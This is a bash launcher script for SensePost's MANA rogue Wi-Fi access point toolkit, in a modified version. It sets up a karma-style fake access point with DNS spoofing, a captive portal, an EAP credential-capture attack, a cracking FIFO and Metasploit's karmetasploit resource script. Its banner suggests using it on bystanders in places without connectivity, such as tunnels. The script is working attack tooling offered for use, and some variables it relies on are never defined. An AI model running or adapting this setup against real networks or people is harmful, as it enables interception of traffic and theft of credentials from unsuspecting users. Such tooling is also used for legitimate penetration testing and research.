#!/bin/bash
# Original script by Dominic White and Ian de Villiers
# Changes made by John & Daniel Cuthbert

# Other Useful variables defined
upstream=eth0
hostname=WRT54G
# phy=wlan0
conf=/root/mana/run-mana/conf/hostapd-karma.conf
hostapd=/root/mana/hostapd-manna/hostapd/hostapd
ifwl="(ifconfig | grep wlan*)"
S1='y'
S2='n'

clear

echo -e "\033[38;5;220m--------------------------------------------------\033[39m"
echo -e "\033[38;5;220m Welcome to SensePost's MANA \033[39m"
echo -e
echo -e "\033[38;5;220m Making Rogue Access Points fun for all \033[39m"
echo -e "\033[38;5;220m @SensePost / http://sensepost.com \033[39m"
echo
echo -e "\033[38;5;220m This script will start MANA in a no \033[39m"
echo -e "\033[38;5;220m upstream mode, with a captive portal and EAP attack. \033[39m"
echo -e "\033[38;5;220m enabled. \033[39m"
echo -e
echo -e "\033[38;5;220m This is useful in places where people often \033[39m"
echo -e "\033[38;5;220m leave their Wi-Fi turned on but there is no \033[39m"
echo -e "\033[38;5;220m Internet connection (tunnels, the tube etc.) \033[39m"
echo -e
echo -e
echo -e
echo -e "\033[38;5;220m This assumes you cloned the git repo into /root/mana"
echo -e
echo -e
echo -e "\033[38;5;220m Press ENTER to continue \033[39m"
echo -e
echo -e "\033[38;5;220m--------------------------------------------------\033[39m"


read

# Prompts the user to ensure their hardware is compatable and properly configured
echo -e "\033[38;5;220mFor this system to work you will need to ensure you have the follwing:\033[39m"
echo -e
echo -e "\033[38;5;220m1. An active network connection for your 'upstream' traffic on eth0\033[39m"
echo -e "\033[38;5;220m2. A wireless network interface that supports 'Master Mode' (For best results use a device with an AR9271 chipset)\033[39m"
echo -e

# Confirmation to continue
function confirm()
{
echo -e "\033[38;5;220mWould you like to proceed?\033[39m"
echo -e
echo -e "\033[38;5;220mENTER y/n\033[39m"
read yn
	if [ $yn == "$S1" ]
			then
					echo -e "\033[38;5;120m Checking for an active network connection on eth0\033[39m"

				elif [ $yn == "$S2" ]
					then
	echo -e "\033[38;5;160mEXITING...${nc}\033[39m" && exit

else
	echo -e "Answer must entered as either 'y' or 'n'" && confirm

fi

# This detects wireless interfaces and exits if no suitable interfaces are found

ntst="$(ping 8.8.8.8 -c 1 -I eth0 | grep received | cut -f 2 -d ',' | cut -f 2 -d ' ')"
	if [ "${ntst}" = '1' ]
			then
				echo -e "\033[38;5;120m Whoop!! an active network connection has been detected\033[39m"
			else
				echo -e "\033[38;5;160m Arse, no active network connection was detected, You should fix this, I'm going to exit now\033[39m" && exit
fi

}

confirm


function detect()
{
echo -e "\033[38;5;120m Detecting wireless interfaces...\033[39m"

echo -e "\033[38;5;120m I've found the following available:\033[39m"
echo -e
ifconfig | grep wlan*
if [ "${ifwl}" == '' ]
then
	echo -e "\033[38;5;160m No wireless interfaces found. Check your antennas batteries and connectors. I'm going to exit now\033[39m" && exit

fi

}

detect


# prompts user to select their wlan from the list found during ifconfig
function sel()
{
echo -e
echo -e "\033[38;5;120m Which wireless interface would you like to use from those available?\033[39m"
read phy

}

sel


# determining wifi suitability
# Checks to ensure that <master mode> is supported by the wireless interface...exits and restarts network-manager if master mode is not supported
function mstrchk()
{
echo -e "\033[38;5;120m Checking that the wlan card is able to run in master mode.\033[39m"
mast="$(iw list | grep '* AP' | head -n1 | cut -d '*' -f 2 | cut -d ' ' -f 2 )"
if [ "${mast}" != 'AP' ]
then
	echo -e "\033[38;5;160m The current wireless interface does not support master mode, I'm going to exit now\033[39m" && exit # service network-manager start && exit

fi

}

mstrchk

# figure out how to change this back to the orignial hostname when finished...perhaps assign the output of <echo /etc/hostname> to a variable and then run <hostname ${vairable name}>???
function nmchng()
{
echo -e "${grn}[+]${nc} Temporarily changing hostname to ${red}$hostname${nc}."  # Will this change only affect this terminal session.?"
hostname $hostname
echo hostname $hostname
sleep 2
}

nmchng

# Get the FIFO for the crack stuffs. Create the FIFO and kick off python process
export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
echo $EXNODE
mkfifo $EXNODE
$crackapd&

service network-manager stop
rfkill unblock wlan


# Start hostapd
echo -e "${grn}[+]${nc} Setting up interfaces, DHCPD and DNS spoofing"
sed -i "s/^interface=.*$/interface=$phy/" $conf
sed -i "s/^bss=.*$/bss=$phy0/" $conf
sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /root/mana/run-mana/conf/karmetasploit.rc
$hostapd $conf&
sleep 5
ifconfig $phy
ifconfig $phy0
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1

dhcpd -cf /root/mana/run-mana/conf/dhcpd.conf $phy
dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf /root/mana/run-mana/conf/dhcpd-two.conf $phy0
dnsspoof -i $phy -f /root/mana/run-mana/conf/dnsspoof.conf&
dnsspoof -i $phy0 -f /root/mana/run-mana/conf/dnsspoof.conf&

echo "${grn}[+]${nc}Pushing captive portal apache virtual host confs into main apache dir"
cp /root/mana/apache/etc/apache2/sites-enabled/* /etc/apache2/sites-enabled
sleep 3
echo "${grn}[+]${nc}All done, now starting Apache, Tinyproxy and msfconsole (this will take a while)"

service apache2 start
service stunnel4 start
tinyproxy -c /root/mana/run-mana/conf/tinyproxy.conf&
msfconsole -r /root/mana/run-mana/conf/karmetasploit.rc&
sleep 20

echo "${grn}[+]${nc}Setting up iptables rules"
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F

echo "${grn}[+]${nc}MANA is now running. If you wish to exit MANA, please press the enter key"

read
pkill hostapd
rm /tmp/crackapd.run
rm $EXNODE
pkill dhcpd
pkill dnsspoof
pkill tinyproxy
pkill stunnel4
pkill msfconsole
service apache2 stop
iptables -t nat -F
